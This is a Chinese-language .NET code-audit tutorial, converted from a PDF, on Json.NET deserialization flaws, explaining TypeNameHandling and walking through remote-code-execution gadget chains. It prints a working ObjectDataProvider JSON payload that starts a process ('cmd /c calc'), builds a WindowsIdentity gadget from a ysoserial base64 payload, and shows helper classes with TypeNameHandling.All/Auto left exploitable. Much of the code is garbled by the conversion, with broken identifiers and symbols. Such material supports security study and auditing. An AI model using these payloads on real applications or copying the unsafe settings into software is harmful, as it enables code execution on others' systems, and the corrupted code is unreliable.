<!--
Source: G:\tmp\安全项目研究\.netskill\.NET高级代码审计（第二课） Json.Net反序列化漏洞.pdf-adc0601b-62e4-4565-9192-8102fae93708\full.md
Archived as: Json.NET raw lesson material
Purpose: provenance-only reference for authorized .NET code audit skill development.
Do not load by default; prefer structured references unless exact source context is needed.
-->
# .NET 高级代码审计（第二课） Json.Net 反序列化漏洞

Ivan1ee@360 云影实验室

![](images/356459d6550b508b683999687ff946ddbad615501e0b668d8ab026443e16dfc6.jpg)

2019 年 03 月 01 日

# 0X00 前言

Newtonsoft.Json，这是一个开源的 Json.Net 库，官方地址：

https://www.newtonsoft.com/json ，一个读写 Json 效率非常高的.Net 库，在做开发的时候，很多数据交换都是以json格式传输的。而使用Json的时候，开发者很多时候会涉及到几个序列化对象的使用：DataContractJsonSerializer，

JavaScriptSerializer 和 Json.NET 即 Newtonsoft.Json。大多数人都会选择性能以及通用性较好Json.NET，这个虽不是微软的类库，但却是一个开源的世界级的Json操作类库，从下面的性能对比就可以看到它的性能优点。

![](images/e60cff78297a9b4c7966412a9fdf4b9e2ed84cfe74d7d62afecc51f8cfbb665f.jpg)

用它可轻松实现.Net中所有类型(对象,基本数据类型等)同Json之间的转换，在带来便捷的同时也隐藏了很大的安全隐患，在某些场景下开发者使用 DeserializeObject 方法序列化不安全的数据，就会造成反序列化漏洞从而实现远程RCE攻击，本文笔者从原理和代码审计的视角做了相关介绍和复现。

![](images/74036ad88e0e8371180d5d06fd2bc6e685c6a61907bd2e96f313f16de7357a94.jpg)

# 0X01 Json.Net 序列化

在 Newtonsoft.Json 中使用 JSONSerializer 可以非常方便的实现.NET 对象与 Json 之间的转化，JSONSerializer 把.NET 对象的属性名转化为 Json 数据中的 Key，把对象的属性值转化为 Json 数据中的 Value，如下 Demo，定义 TestClass 对象

[ JsonObject(MemberLocalizationOPTIn)]   
public class TestClass{ private string classname; private string name; private int age; [JsonIgnore] public string classname { get $\Rightarrow$ classname; set $\Rightarrow$ classname $=$ value;} [JsonProperty] public string Name { get $\Rightarrow$ name; set $\Rightarrow$ name $=$ value;} [JsonProperty] public int Age { get $\Rightarrow$ age; set $\Rightarrow$ age $=$ value;} public override stringToString() { return base.ToString(); } public static void ClassMethod( string value) { Process.Start(value); }

并有三个成员，Classname在序列化的过程中被忽略（JsonIgnore），此外实现了一个静态方法 ClassMethod 启动进程。 序列化过程通过创建对象实例分别给成员赋值，

```txt
TestClass testClass = new TestClass();
testClass.Classname = "360";
testClass.Name = "Ivan1ee";
testClass.Age = 18;
string testString = JsonConvert.serializeObject(testClass);
Console.WriteLine(testString); 
```

用 JsonConvert.SerializeObject 得到序列化后的字符串

```json
{"Name":"Ivan1ee","Age":18} 
```

Json字符串中并没有包含方法ClassMethod，因为它是静态方法，不参与实例化的过程，自然在 testClass 这个对象中不存在。这就是一个最简单的序列化 Demo。为了尽量保证序列化过程不抛出异常，笔者引入 SerializeObject 方法的第二个参数并实例化创建 JsonSerializerSettings，下面列出属性

NullValueHandling：如果序列化时需要忽略值为 NULL 的属性，使用JsonSerializerSettings.NullValueHandling.Ignore 来实现；  
TypeNameAssemblyFormatHandling：默认情况下 Json.NET 只使用类型中的部分程序集名称，如：System.Data.DataSet，为了避免在一些环境下不兼容的问题，需要用到完整的程序集名称，包括版本号、公钥等，所以用到JsonSerializerSettings.TypeNameAssemblyFormatHandling.Full；  
TypeNameHandling：控制 Json.NET 是否在使用$type 属性进行序列化时包含.NET类型名称，并从该属性读取.NET类型名称以确定在反序列化期间要创建的类型

修改代码添加 TypeNameAssemblyFormatHandling.Full、TypeNameHandling.ALL

```txt
TestClass testClass = new TestClass();
testClass.Classname = "360";
testClass.Name = "Ivan1ee";
testClass.Age = 18;
string testString = JsonConverticlesObject(testClass, new JsonSerializerSettings {
    NullValueHandling = NullValueHandling Ignore,
   TypeNameAssemblyFormatHandling =TypeNameAssemblyFormatHandling.Full,
   TypeNameHandling =TypeNameHandling.All,
}); 
```

将代码改成这样后得到的testString变量值才是笔者想要的，打印的数据中带有完整的程序集名等信息。

```json
{"type":"WpfApp1.TestClass, WpfApp1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null", "Name":"Ivan1ee", "Age":18} 
```

# 0x02 Json.Net 反序列化

# 2.1、反序列化用法

反序列过程就是将 Json 字符串转换为对象，通过创建一个新对象的方式调用

JsonConvert.DeserializeObject 方法实现的，传入两个参数，第一个参数需要被序列化的字符串、第二个参数设置序列化配置选项来指定JsonSerializer 按照指定的类型名称处理，其中 TypeNameHandling 可选择的成员分为五种

<table><tr><td></td><td>Member name</td><td>Value</td><td>Description</td></tr><tr><td></td><td>None</td><td>0</td><td>Do not include the .NET type name when serializing types.</td></tr><tr><td></td><td>Objects</td><td>1</td><td>Include the .NET type name when serializing into a JSON object structure.</td></tr><tr><td></td><td>Arrays</td><td>2</td><td>Include the .NET type name when serializing into a JSON array structure.</td></tr><tr><td></td><td>All</td><td>3</td><td>Always include the .NET type name when serializing.</td></tr><tr><td></td><td>Auto</td><td>4</td><td>Include the .NET type name when the type of the object being serialized is not the same as its object by default. To include the root object&#x27;s type name in JSON you must specify a root type or serialize JsonWriter, Object, Type).</td></tr></table>

默认情况下设置为 TypeNameHandling.None，表示 Json.NET 在反序列化期间不读取或写入类型名称。具体代码可参考以下

```javascript
string payload2 = {"\"$type": "WpfApp1.TestClass, WpfApp1, Version=1.0.0.0, Culture=neutral, PublicKeyToken null", "Name": "IvanLee", "Age": 18};
Object obj2 = JsonConvert.DeserializationObject<testclass>(payload2, new JsonSerializerSettings
{
   TypeNameHandling = ClassNameHandling.None
}); 
```

# 2.2、攻击向量—ObjectDataProvider

漏洞的触发点也是在于TypeNameHandling这个枚举值，如果开发者设置为非空值、也就是对象（Objects） 、数组（Arrays） 、自动识别 (Auto) 、所有值(ALL) 的时候都会造成反序列化漏洞，为此官方文档里也标注了警告，当您的应用程序从外部源反序列化 JSON 时应谨慎使用 TypeNameHandling。

# TypeNameHandling

# A Caution

TypeNameHandling should be used with caution when your application deserializes JSON from an external source.

Incoming typesshouldbevalidated withacustom ISerializationBinderwhendeserializingwithavalueotherthanTypeNameHandling.None.

笔者继续选择 ObjectDataProvider 类方便调用任意被引用类中的方法，具体有关此类的用法可以看一下《.NET高级代码审计（第一课）XmlSerializer反序列化漏洞》，首先来序列化 TestClass

```txt
ObjectDataProvider odp = new ObjectDataProvider();  
odp.MethodName = "ClassMethod";  
odp.MethodParameters.Add("calc.exe");  
odp.ObjectInstance = testClass;  
string obj1 = JsonConverticlesObject(odp, new JsonSerializerSettings{TypeNameHandling =TypeNameHandling.All,TypeNameAssemblyFormatHandling =TypeNameAssemblyFormatHandling.Full, }); 
```

指定 TypeNameHandling.All、TypeNameAssemblyFormatHandling.Full 后得到序列化后的 Json 字符串

{"type":"System.Windows.Data.ObjectDataProvider,PresentationFramework, Version=4.0.0.0,Culture $\equiv$ neutral,   
PublicKeyToken $=$ 31bf3856ad364e35", "ObjectInstance": {"type":"WpfApp1.Test Class,WpfApp1,Version $= 1.0.0.0$ ,Culture $\equiv$ neutral,   
PublicKeyToken $\equiv$ null","Name":null,"Age":0},"MethodName":"ClassMethod","M methodParameters":"\\(type":"MS Internal.Data.ParametersCollection,   
PresentationFramework, Version $= 4.0.0.0$ ,Culture $\equiv$ neutral,   
PublicKeyToken $=$ 31bf3856ad364e35",\\)values":["calc.exe)], "IsAsynchronous": false, "IsInitialLoadEnabled":true, "Data":null, "Error":null}

如何构造 System.Diagnostics.Process 序列化的 Json 字符串呢？笔者需要做的工作替换掉 ObjectInstance 的$type、MethodName 的值以及 MethodParameters 的$type值，删除一些不需要的Member、最终得到的反序列话Json字符串如下

{   
'\ $type':\$ System.Windows.Data.ObjectDataProvider,   
PresentationFramework, Version $= 4.0.0.0$ ,Culture $\equiv$ neutral,   
PublicKeyToken $= 31$ bf3856ad364e35',   
'MethodName': 'Start',   
'MethodParameters':{   
\ $type':\$ System.CollectionsagherList, mscorlib, Version $= 4.0.0.0$ Culture $\equiv$ neutral, PublicKeyToken $\equiv$ b77a5c561934e089',   
\\(values':['cmd', '/c calc']   
},   
'ObjectInstance':{'\\)type':'System.Diagnostics.Process, System, Version $= 4.0.0.0$ ,Culture $\equiv$ neutral, PublicKeyToken $\equiv$ b77a5c561934e089'}   
}

再经过 JsonConvert.DeserializeObject 反序列化（注意一点指定TypeNameHandling 的值一定不能是 None），成功弹出计算器。

![](images/aa574b74a5a9267835d3bce3643aa0988534cf1c28e63decb124f2b2aa32bac5.jpg)

# 2.3、攻击向量—WindowsIdentity

WindowsIdentity 类位于 System.Security.Principal 命名空间下。顾名思义，用于表示基于 Windows 认证的身份，认证是安全体系的第一道屏障肩负着守护着整个应用或者服务的第一道大门，此类定义了Windows身份一系列属性

```cs
public virtual bool IsGuest { get; }   
public virtual bool IsSystem { get; }   
public virtual bool IsAnonymous { get; }   
public override string Name { get; }   
public virtual IntPtr Token { get; }   
public SecurityIdentifier User { get; }   
public IdentityReferenceCollection Groups { get; }   
public override bool IsAuthenticationated { get; }   
public SafeAccessTokenHandle AccessToken { get; }   
public virtual IEnumerable<Claim> UserClaims { get; }   
public SecurityIdentifier Owner { get; }   
public TokenImpersonationLevel ImpersonationLevel { get; }   
public override IEnumerable<Claim> Claims { get; }   
public virtual IEnumerable<Claim> DeviceClaims { get; }   
public sealed override string AuthenticationType { get; } 
```

对于用于表示认证类型的 AuthenticationType 属性来说，在工作组模式下返回 NTLM。对于域模式，如果操作系统是 Vista 或者以后的版本，该属性返回 Negotiate，表示采用 SPNEGO 认证协议。而对于之前的 Windows 版本，则该属性值为 Kerberos。Groups 属性返回 WindowsIdentity 对应的 Windows 帐号所在的用户组（UserGroup），而IsGuest则用于判断Windows帐号是否存在于Guest用户组中。IsSystem属性则表示 Windows 帐号是否是一个系统帐号。对于匿名登录，IIS 实际上会采用一个预先指定的 Windows 帐号进行登录。而在这里，IsAnonymous 属性就表示该WindowsIdentity 对应的 Windows 帐号是否是匿名帐号。

# 2.3.1、ISerializable

跟踪定义得知继承于 ClaimsIdentity 类，并且实现了 ISerializable 接口

```cs
namespace System.Security.Principal
{
    ..public class WindowsIdentity : ClaimsIdentity, ISerializable, IDeserializationCallback, IDisable
    {
        ..public const string DefaultIssuer = "AD AUTHORITY";
    }
    ..public WindowsIdentity(IntPtr userToken);
    ..public WindowsIdentity(string sUserPrincipalName);
    ..public WindowsIdentity(IntPtr userToken, string type);
    ..public WindowsIdentity(string sUserPrincipalName, string type);
    ..public WindowsIdentity(EnumerationInfo info, StreamingContext context);
    ..public WindowsIdentity(IntPtr userToken, string type, WindowsAccountType acctType);
    ..public WindowsIdentity(IntPtr userToken, string type, WindowsAccountType acctType, bool isAuthenticated);
    ..protected WindowsIdentity(WindowsIdentity identity);
} 
```

查看定义得知，只有一个方法 GetObjectData

![](images/b96f08a5efead25ac450b559922634d347f47d80b6c20e266c9806465f991747.jpg)

在.NET 运行时序列化的过程中 CLR 提供了控制序列化数据的特性，如：OnSerializing、OnSerialized、NonSerialized 等。为了对序列化数据进行完全控制，就需要实现Serialization.ISeralizable 接口，这个接口只有一个方法，即 GetObjectData，第一个参数 SerializationInfo 包含了要为对象序列化的值的合集，传递两个参数给它：Type和 IFormatterConverter，其中 Type 参数表示要序列化的对象全名（包括了程序集名、版本、公钥等），这点对于构造恶意的反序列化字符串至关重要

![](images/2b329886fcb6a080b36a6ef761af378988787de589ee2098e5d38a0b2e6ffce0.jpg)

另一方面 GetObjectData 又调用 SerializationInfo 类提供的 AddValue 多个重载方法来指定序列化的信息，AddValue 添加的是一组<key,value> ；GetObjectData 负责添加好所有必要的序列化信息。

```java
public void GetObjectData(ServletizationInfo info, StreamingContext context) { info.Type(typeof(WindowsIdentity)); info.AddValue("Name", "Ivan1ee"); } 
```

# 2.3.2、ClaimsIdentity

ClaimsIdentity（声称标识）位于 System.Security.Claims 命名空间下，首先看下类的定义

![](images/b74051ab2045179a3be1ac0131e88cdea188ee28e3b132964e4f2d1844863895.jpg)

其实就是一个个包含了 claims 构成的单元体，举个栗子：驾照中的“身份证号码：$0 0 0 0 0 0 ^ { \prime \prime }$ 是一个claim、持证人的“姓名: Ivan1ee”是另一个claim、这一组键值对构成了一个 Identity，具有这些 claims 的 Identity 就是 ClaimsIdentity，通常用在登录Cookie 验证，如下代码

```javascript
var claimsIdentity = new ClaimsIdentity(new Claim[] { new Claim(ClaimTypes.Name, loginName) }, "Basic");  
var claimsPrincipal = new ClaimsPrincipal(ClaimsIdentity);  
await context抗氧化_SIGNInAsync(_cookieAuthOptionsAuthenticationScheme, claimsPrincipal); 
```

一般使用的场景我想已经说明白了，现在来看下类的成员有哪些，能赋值的又有哪些？

参考官方文档可以看到 Lable、BootstrapContext、Actor 三个属性具备了 set

# 属性

![](images/584a9420a68a73a8aeb19daf59a42363c8f711195e54a1acda2981ac5a33c0ea.jpg)

查阅文档可知，这几个属性的原始成员分别为 actor、bootstrapContext、lable 如下  
```ini
[NonSerializable]  
const string PreFix = "System.SecurityClaimsIdentity.";  
[NonSerializable]  
const string ActorKey = PreFix + "actor";  
[NonSerializable]  
const string AuthenticationTypeKey = PreFix + "authenticationType";  
[NonSerializable]  
const string BootstrapsContextKey = PreFix + "bootstrapsContext";  
[NonSerializable]  
const string ClaimsKey = PreFix + "claims";  
[NonSerializable]  
const string LabelKey = PreFix + "label";  
[NonSerializable]  
const string NameClaimTypeKey = PreFix + "nameClaimType";  
[NonSerializable]  
const string RoleClaimTypeKey = PreFix + "roleClaimType";  
[NonSerializable]  
const string VersionKey = PreFix + "version";  
[NonSerializable]  
public const string DefaultIssuer = @"LOCAL AUTHORITY";  
[NonSerializable]  
public const string DefaultNameClaimType = ClaimTypes.Name;  
[NonSerializable]  
public const string DefaultRoleClaimType = ClaimTypes.Role; 
```

ClaimsIdentity 类初始化方法有两个重载，并且通过前文介绍的 SerializationInfo 来传入数据，最后用 Deserialize 反序列化数据。  
```cs
// <summary>   
// Initializes an instance of <see ref="Identity"/> from a serialized stream created via   
// <see ref="Serializable"/>.   
// </summary>   
// <param name="info">   
// The <see ref="網絡"/> to read from.   
// </param>   
// <param name="context"/>The <see ref="StreamingContext"/> for serialization. Can be null.</param>   
// <exception ref="ArgumentNullException"/>Thrown is the <paramref name="info"/> is null.</exception>   
[SecurityCritical]   
protected ClaimsIdentity(ServletizationInfo info, StreamingContext context)   
{ if (null == info) { throw new ArgumentNullException("info"); } Deserialization(info, context, true);   
}   
// <summary>   
// initializes an instance of <see ref="Identity"/> from a serialized stream created via   
// <see ref="Serializable"/>.   
// </summary>   
// <param name="info">   
// The <see ref="StreamingInfo"/> to read from.   
// </param>   
// <exception ref="ArgumentNullException"/>Thrown is the <paramref name="info"/> is null.</exception>   
[SecurityCritical]   
protected ClaimsIdentity(ServletizationInfo info)   
{ if (null == info) { throw new ArgumentNullException("info"); } StreamingContext sc = new StreamingContext(); Deserialization(info, sc, false);   
}   
#endregion 
```

追 溯 的 过 程 有 点 像 框 架 类 的 代 码 审 计 ， 跟 踪 到 Deserialize 方 法 体 内 ， 查 找BootstrapContextKey 才知道原来它还需要被外层 base64 解码后带入反序列化

```txt
case BootstrapContextKey: using (MemoryStream ms = new MemoryStream Convert.FromBase64String(info.GetString(BootstrapContextKey)))) { m.bootstrapContext = bf.Deserialization(ms, null, false); } break; 
```

# 2.3.3、打造 Poc

回过头来想一下，如果使用 GetObjectData 类中的 AddValue 方法添加“key :System.Security.ClaimsIdentity.bootstrapContext“、”value : base64 编码后的payload“，最后实现 System.Security.Principal.WindowsIdentity.ISerializable 接口就能攻击成功。首先定义 WindowsIdentityTest 类

[Serializable]   
public class WindowsIdentityTest : ISerializable   
{ public WindowsIdentityTest(string strContent) { StrContent $=$ strContent; } private string StrContent { get; } public void GetobjectData(CompressionInfo info, StreamingContext context) { info.Type(typeof(WindowsIdentity)); info.AddValue("System.Security ClaimsIdentity.),StrContent); }

笔者用 ysoserial 生成反序列化 Base64 Payload 赋值给 BootstrapContextKey，实现代码如下

![](images/73e85aa97e0d9a24a03df0e70de476857394c41352feee521c3a1719c4428252.jpg)

到这步生成变量 obj1 的值就是一段 poc，但还需改造一下，将$type 值改为System.Security.Principal.WindowsIdentity 完全限定名

![](images/ce449a5a3c5dcd36d10532be9af0361f6f9ebe9e73055fa82f19dfa531823688.jpg)

最后改进后交给反序列化代码执行，抛出异常之前触发计算器，效果如下图

![](images/453b039557fbaf91a93ad87e19b626a6e46fba579b400d555fe293e36292b87f.jpg)

# 0x03 代码审计视角

从代码审计的角度其实很容易找到漏洞的污染点，通过前面几个小节的知识能发现需要满足一个关键条件非 TypeNameHandling.None 的枚举值都可以被反序列化，例如以下 Json 类

public class JsonUtilis   
public static string Stringify(object_in) { var indented $=$ Formattingindented; var settings $=$ new JsonSerializerSettings() { TableNameHandling $=$ TypeNameHandling.All }； return JsonConvert.Deserialization(object_in,indented,settings); }   
public static T Deserialization(string in) { var settings $=$ new JsonSerializerSettings() { TableNameHandling $=$ TypeNameHandling.All }； return JsonConvert.DeserializationObject(_in,settings);   
}   
public static object Deserialization(string in) { var settings $=$ new JsonSerializerSettings() { TableNameHandling $=$ TypeNameHandling.All }； return JsonConvert.Deserialization(object_in,settings);   
}   
public static object Populateobject(object instance, string source) { var settings $=$ new JsonSerializerSettings() { TableNameHandling $=$ TypeNameHandling.All }； JsonConvert.Populateobject.source,instance,settings); return instance;

都设置成TypeNameHandling.All，攻击者只需要控制传入参数 _in便可轻松实现反序列化漏洞攻击。Github上很多的json类存在漏洞，例如下图

```cs
public static object FromJsonAuto(this string value, Type tp)  
{  
    var settings = new JsonSerializerSettings()  
{  
       TypeNameHandling =TypeNameHandling.Auto  
    };  
    try  
    {  
        return JsonConvert.DeserializationObject(value, tp, settings);  
    }  
    catch  
    {  
        return null;  
    }  
}  
public static T FromJsonAuto<T>(this string value)  
{  
    var settings = new JsonSerializerSettings()  
{  
       TypeNameHandling =TypeNameHandling.Auto  
    };  
    try  
    {  
        return JsonConvert.DeserializationObject<T>(value, settings);  
    }  
    catch  
    {  
        return default(T);  
    }  
} 
```

代码中改用了Auto这个值，只要不是None值在条件许可的情况下都可以触发漏洞，笔者相信肯定还有更多的漏洞污染点，需要大家在代码审计的过程中一起去发掘。

# 0x04 案例复盘

最后再通过下面案例来复盘整个过程，全程展示在VS里调试里通过反序列化漏洞弹出计算器。

1. 输入 http://localhost:5651/Default Post 加载 value 值

![](images/6cd668b17abe3e11297c3d0e8673a81cc79718f264cea222eeb1e67bf8a4f234.jpg)

2. 通过 JsonConvert.DeserializeObject 反序列化 ，并弹出计算器

![](images/637c3921319bda88e47cd5bf980424d955937b678fec0dc25cf56c023daa1e71.jpg)  
最后附上动图

![](images/13a032550b1bd48c1d51d46829ad5663c3d263671dccc79f08beef7284f1fbfb.jpg)

# 0x05 总结

Newtonsoft.Json库在实际开发中使用率还是很高的，攻击场景也较丰富，作为漏洞挖掘者可以多多关注这个点，攻击向量建议选择ObjectDataProvider，只因生成的Poc体积相对较小。最后.NET反序列化系列课程笔者会同步到

https://github.com/Ivan1ee/ 、https://ivan1ee.gitbook.io/ ，后续笔者将陆续推出高质量的.NET反序列化漏洞文章，欢迎大伙持续关注，交流，更多的.NET安全和技巧可关注实验室公众号或者笔者的小密圈。

![](images/2c66441cfd93f7467534c59141b9a16d1bfcdf6d75d30eb0c7d15ad45297df55.jpg)
